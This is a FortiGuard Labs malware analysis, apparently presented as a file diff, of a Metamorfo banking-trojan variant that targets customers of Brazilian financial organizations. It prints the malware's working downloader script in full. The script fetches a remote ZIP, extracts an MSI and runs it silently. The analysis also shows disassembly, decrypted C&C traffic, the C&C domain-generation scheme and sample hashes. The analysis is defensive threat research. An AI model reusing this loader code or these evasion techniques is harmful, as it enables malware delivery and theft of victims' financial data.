@@ -1,0 +1,228 @@
+FortiGuard Labs Threat Analysis
+FortiGuard Labs recently captured a suspicious sample from a phishing email.
+After a quick analysis, I determined that this was a new variant of the Metamorfo malware, which was known for collecting data from the customers of Brazilian financial organizations.
+In this analysis, I will elaborate what this new variant of Metamorfo does and what data it collects from a victim’s machine, as well as how it communicates with its command and control (C&C) server.
+The email content was in Portuguese, which is the official language of Brazil.
+The email content is translated into English in Figure 1.
+It was disguised as a notice asking the victim to download an Electronic Invoice (NF).
+When moving a mouse over the blue download button, the file download URL is shown in the status bar.
+The downloaded file was not an electronic invoice, but a ZIP file with the MSI file name “XlsPlan_Visualize.msi”.
+As we know, an MSI file is an installer package file used for the installation, storage, and removal of programs by Windows OS.
+However, MSI file is not an executable file like an EXE file, whose content is saved in OLE document format.
+Instead, double clicking on any MSI file causes the Windows system to call MsiExec.exe to process it.
+There were forty-eight streams (similar to files) inside this “XlsPlan_Visualize.msi” file.
+Figure 2 shows a part of those streams.
+However, this MSI file is not the final malware body, but simply a malware downloader.
+Let’s go inside the file to see how it works.
+The “!_StringData” stream contains a piece of VBS code that is executed by MsiExec.exe to download another malicious file.
+This code was mixed with a lot of garbage strings, as you can see in Figure 3.
+The highlighted section is part of the VBS code, which has been extracted and listed below:
+FJSJSKDFSJDFKJS = "https://raw.githubusercontent.com/edx23/X435/master/img.zip";
+JFJDKDAKSS = "";
+ppasta = "\\Downloads";
+JJJFDNMCNNN = " @ p u b l i c @ " + ppasta;
+JJKKSMNfF = "KJFLDKRE";
+JFJKNNDNDFJKDD = "wscript.shell";
+JMDNNSKDJFFF = "Shell.Application"
+RURIEJNDDS = "Msxml2.XMLHTTP";
+JDNNNSC = "scripting.filesystemobject";
+JNDDSFCCD = "GET";
+NNCDSXXX = "Adodb.Stream";
+JJDALV = "img.jpg";
+NXXXDSF = "zip";
+JJJFDNMCNNN = JJJFDNMCNNN.replace(/@/g, "%");
+JJJFDNMCNNN = JJJFDNMCNNN.replace(/ /g, "");
+KDJNNNDM = new ActiveXObject(JFJKNNDNDFJKDD);
+JHDHDNSKKK = new ActiveXObject(JDNNNSC);
+JDNFMDNSKKJDDDD = new ActiveXObject(JMDNNSKDJFFF);
+JJJFDNMCNNN = KDJNNNDM.expandenvironmentstrings(JJJFDNMCNNN) + "\\";
+NNNNDFSG = JJKKSMNfF + "_";
+VJJKRRIEO = JJKKSMNfF;
+VJJKRRIEO = VJJKRRIEO.replace(/ /g, "");
+FJSJSKDFSJDFKJS = FJSJSKDFSJDFKJS.replace(/qrzck/g, "");
+JFJDKDAKSS = JFJDKDAKSS.replace(/qrzck/g, "");
+JQOVID = NNNNDFSG + VJJKRRIEO + "_" + JJKKSMNfF + "."
++ NXXXDSF;
+EQMJKG = JQOVID;
+JJJFDNMCNNN = JJJFDNMCNNN.replace(/\\/g, "@");
+JJJFDNMCNNN = JJJFDNMCNNN.replace(/@/g, "\\" + "\\");
+function unzip(zipfile, unzipdir) {
+try {
+var JHDHDNSKKK = new ActiveXObject(JDNNNSC),
+JDNFMDNSKKJDDDD = new ActiveXObject(JMDNNSKDJFFF),
+dst, zip;
+if (!unzipdir) { unzipdir = '.
+'; }
+if (!JHDHDNSKKK.FolderExists(unzipdir))
+{JHDHDNSKKK.CreateFolder(unzipdir);}
+dst = JDNFMDNSKKJDDDD.NameSpace(JHDHDNSKKK.getFolder(unzipdir).Path);
+zip = JDNFMDNSKKJDDDD.NameSpace(JHDHDNSKKK.getFile(zipfile).Path);
+if (JHDHDNSKKK.FileExists(zipfile)) {
+dst.CopyHere(zip.Items(), 4 + 16);
+JHDHDNSKKK.DeleteFile(zipfile);
+JHDHDNSKKK.MoveFile(unzipdir + "\\" + JJDALV, unzipdir + "\\" + JJKKSMNfF + ".msi");
+KDJNNNDM.Run(unzipdir + "\\" + JJKKSMNfF + ".msi /quiet", 0, false);
+}
+}catch (e) { }
+}
+try {
+OOOOJBJKDDS = new ActiveXObject(RURIEJNDDS);
+OOOOJBJKDDS.open(JNDDSFCCD, FJSJSKDFSJDFKJS + JFJDKDAKSS, false);
+OOOOJBJKDDS.send();
+}catch (e) {}
+if (OOOOJBJKDDS.status == 200) {
+try {
+var UHJEERESC = new ActiveXObject(NNCDSXXX);
+UHJEERESC.open();
+UHJEERESC.type = 1;
+UHJEERESC.write(OOOOJBJKDDS.responseBody);
+UHJEERESC.Position = 0;
+UHJEERESC.saveToFile(JJJFDNMCNNN + JQOVID, 2);
+UHJEERESC.close();
+unzip(JJJFDNMCNNN + JQOVID, JJJFDNMCNNN + JJKKSMNfF);
+} catch (e) { }
+}
+Going through this VBS code we learn that it downloads the “img.zip” file from the url “hxxps://raw.githubusercontent.com/edx23/X435/master/img.zip”, calls the unzip() function to decompress the file into the folder located at “%Public%\Downloads\KJFLDKRE”, and then renames the file as “KJFLDKRE.msi”.
+Finally, it executes this file with the parameter “/quiet”.
+The “/quiet” parameter has the process run in the background with no user interface, so the victim doesn’t notice it.
+“KJFLDKRE.msi” contains an EXE file split into several parts, each of which is known as a stream.
+Figure 4 is a screenshot of the content of “KJFLDKRE.msi”.
+As you can see, the sections in the PE structure were split into several streams, such as “CODE”, “DATA”, and so on.
+When this MSI file runs in MsiExec.exe, the PE file (EXE file) is restored into C:\Windows\Installar and then executed.
+The filename is not fixed.
+In this case, it is “MSIA1F6.tmp”.
+Using an analysis tool, I determined that the file was written in Delphi.
+Figure 5 below shows more detailed information of this “MSIAIF6.tmp” file.
+“KJFLDKRE.msi” is the real Metamorfo malware, and as mentioned earlier, it runs in the background.
+In fact, “MSIA1F6.tmp” is extracted from “KJFLDKRE.msi” and executed in a child process of MsiExec.exe.
+All tasks of the new variant of Metamorfo are performed by “MSIA1F6.tmp” and the following analysis is based on that.
+I will now show you how it functions inside a victim’s machine in the remaining sections:
+“MSIA1F6.tmp” uses several Timers to finish its work.
+It first starts a Timer named Timer3, which is triggered once each 500 MS.
+In its timer function, it collects the victim’s system information, such as the Windows version, Login user name, and so on.
+It then adds an auto-run program inside victim’s system registry, so that it runs when the system starts.
+The top of Figure 6 shows that it has been added into the auto-run group in the system registry of my test machine, and below that is where the “KJFLDKRE.msi” file is located.
+To prevent the victim from noticing any exception on the process list, it terminates the MsiExec.exe process.
+It looks for the MsiExec.exe process in the running process list by its name and then it calls TerminateProcess() to kill the process.
+It needs at least four MsiExec.exe processes to finally execute “MSIA1F6.tmp”.
+Figure 7 is a code snippet used to kill four “msiexec.exe” processes.
+As you may have noticed, the process name “msiexec.exe” is decrypted.
+Besides this, it contains another nearly 2,000 encrypted strings in the process, which creates a serious challenge for an analyst trying to understand its code.
+It then kills Timer3 and starts Timer1.
+Timer1’s interval is set the same as Timer3’s, which is 500 MS.
+The major task of this timer function is to find the most interesting Apps or web pages based on the victim’s behaviors.
+It obtains the window title of the topmost program the victim is using at each 500 MS interval, calls the APIs GetForegroundWindow() and GetWindowTextA(), and then performs a string match to determine if that program is the one that it wants to collect information from.
+During my analysis, I was able to determine that the targets are all Brazilian financial organizations.
+Next, I will elaborate all of the ways that Metamorfo determines if those programs are running.
+It detects three installed finance applications by calling the API FindWindowA(), with the Windows class for each one.
+Here is an example code showing how it finds one application by calling FindWindowA("SunAwtFrame", 0).
+[…]
+00525A1D push 0 ; lpWindowName
+00525A1F lea edx, [ebp+var_124]
+00525A25 mov eax, offset _str_C0589A51A329AEA.Text ; ;;; de=> [SunAwtFrame]
+00525A2A call decrypt_string
+00525A2F mov eax, [ebp+var_124] ;"SunAwtFrame"
+00525A35 call @System@@LStrToPChar$qqrx17System@AnsiString
+00525A3A push eax ; lpClassName "SunAwtFrame"
+00525A3B call FindWindowA
+00525A40 cmp eax, [edi]
+00525A42 jnz short loc_525AA1
+[…]
+When the victim opens the web page of an online bank, the web page title will include the bank name information.
+Metamorfo uses string matching to determine if the victim is working on a financial web page using a variety of institution names and acronyms.
+Below is a code snippet of how Metamorfo performs a string match:
+[...]
+00525E93 lea edx, [ebp+var_1B4]
+00525E99 mov eax, [ebp+var_4] ; System::AnsiString
+00525E9C call @Sysutils@UpperCase$qqrx17System@AnsiString ; Sysutils::UpperCase(System::AnsiString)
+00525EA1 mov eax, [ebp+var_1B4]
+00525EA7 push eax
+00525EA8 lea edx, [ebp+var_1B8]
+00525EAE mov eax, offset _str_0A1336275B9FD74.Text ; ;;; de=> [Name of the bank]
+00525EB3 call decrypt_string
+00525EB8 mov eax, [ebp+var_1B8] ;”Name of the bank”
+00525EBE pop edx ; upper case of topmost window title
+00525EBF call string_match
+00525EC4 test eax, eax
+00525EC6 jg short Name of the bank_found
+00525EC8 lea edx, [ebp+var_1BC]
+00525ECE mov eax, offset _str_29DB1CCA0BB2122.Text ; ;;; de=> [Alternate name of the bank]
+00525ED3 call decrypt_string
+00525ED8 mov eax, [ebp+var_1BC] ;”Alternate name of the bank”
+00525EDE mov edx, [ebp+var_4] ; topmost window title
+00525EE1 call string_match
+00525EE6 test eax, eax
+00525EE8 jg short Alternate name of the bank_found
+00525EEA lea edx, [ebp+var_1C0]
+00525EF0 mov eax, offset _str_0435F40658F86D8.Text ; ;;; de=> [Bank URL]
+00525EF5 call decrypt_string
+00525EFA mov eax, [ebp+var_1C0] ;”Bank URL”
+00525F00 mov edx, [ebp+var_4] ; topmost window title
+00525F03 call string_match
+00525F08 test eax, eax
+00525F0A jle short loc_525F69
+[...]
+As mentioned before, those matching strings are encrypted, but they are decrypted before being used in string_match().
+Once any of the strings is matched, Metamorfo records the financial organization’s name in a global variable and it then connects to its C&C server to tell what was triggered and to receive command and control commands.
+If none of string matches is triggered, Metamorfo does nothing, but keeps checking with Timer1 every 500 MS.
+To increase the difficulty of being blocked, the host of C&C server is generated dynamically in a special way, which keeps the host string mutative each time.
+There is a function which is in charge of this task.
+Here is an example of a host string: “ssqld12g1744gu.dynu.com”.
+The last part, “.dynu.com”, is fixed.
+The first part is a combination that consists of three parts, which are “ssq1d”, “12” and “g17744gu”.
+“12” is the number of the current month, for instance: “12” for Dec, “01” for Jan, “02” for Feb and so on.
+The other two substrings are constant strings.
+There are a total of 620 constant strings that can generate 620 host strings, which are split into 31 groups, one for every day of the month.
+Each group then has 20 strings for each day, and the function randomly picks one of these.
+All of these constant strings are encrypted, and are only decrypted just before using.
+From Figure 8, you can see the decrypted host strings for December.
+There are 31 lines, one for each day, and 20 on each line, each separated by a comma.
+For other months it changes the “12” in the middle to the corresponding month number.
+Using the same model, it has 310 ports, or 10 ports for each day.
+There is a separate function for randomly picking up a port from the 10 ports assigned to the day number (1-31).
+Figure 9 shows the detail for those decrypted ports.
+On my test machine, I opened the web page of a listed Brazilian financial organization to trigger a string match in Timer1.
+It then connected to the C&C server and relayed the information that a financial organization connection had been detected.
+I captured that encrypted communication traffic and decrypted it.
+The results are listed below:
+[<<MANDASOCKET>>]
+<|OK|>
+<|Socket-Principal|>6294954<<|
+<|Info|>8974<|> Bank Name <|>****-PC V.8 <|>Windows 7 Ultimate<|><<|
+[-PING-]
+[-PING-]
+[-PING-]
+[-VIDEO-]
+[-PONG-]
+[-PING-]
+[-PONG-]
+[-PING-]
+[-PONG-]
+[-PING-]
+[-REINICIAR-OS-]
+[-PONG-]
+When the connection is established, it sends “[<<MANDASOCKET>>]” first, and the server replies “<|OK|>”, which asks for the information about what happened on the victim’s device.
+An “<|Info|>” packet is then sent out containing the port number (8974), "Bank Name" is the name of the financial organization, the victim’s computer name (****-PC), client version (V.8), as well as victim’s OS name (Windows 7 Ultimate).
+NOTE: “<|>” is kind of a delimiter, while “<<|” is an end symbol.
+In the Metamorfo client there is a function called Conn1Read(), a function of the Conn1 socket which processes the control commands from the C&C server for this main socket.
+Figure 10 is a screenshot of when Metamorfo is about to encrypt the <|Info|> packet in a debugger.
+As you can see from the traffic above, there are many other commands, like "[-PING-]", "[-PONG-]", "[-VIDEO-]" and so on.
+Going through the function Conn1Read(), I obtained all of the control commands and the purpose of each command.
+The following table lists most of the control commands for the main socket and their descriptions.
+Conn2Read() is a function of the Conn2 socket to receive and process the command and control commands from the C&C server.
+Conn2 socket starts when received the command “[-VIDEO-]” in Conn1Read().
+The table below shows its commands and descriptions:
+If you are a customer of a targeted Brazilian financial organization and you never run their applications or open one of their web pages on an infected computer, this variant of Metamorfo will not collect information.
+The two downloaded URLs are rated as “Malicious Websites“ by the FortiGuard Web Filtering service.
+Both of the MSI files are detected and blocked by the FortiGuard Antivirus service.
+URLs
+hxxps://is.gd/vphbra?YTOMHZO3IYSYBGB86SYFIT/862023/YTOMHZO3IYSYBGB86SYFIT
+hxxps://raw.githubusercontent.com/edx23/X435/master/img.zip
+Sample SHA-256
+[XlsPlan_Visualize.msi]
+631F6664876C1BD02BE60A8AF9A44030307E0FFA2C1239A95559559EDD0481D3
+[img.jpg or KJFLDKRE.msi]
+1A37AC4498AE3071DE271970E992968505BE95177FBB5BE2A3DA33A3A1514CEC
+Learn more about FortiGuard Labs threat research and the FortiGuard Security Subscriptions and Services portfolio.
+Sign up for the weekly Threat Brief from FortiGuard Labs.
+Learn more about Fortinet’s free cybersecurity training initiative or about the Fortinet Network Security Expert program, Network Security Academy program, and FortiVet program.
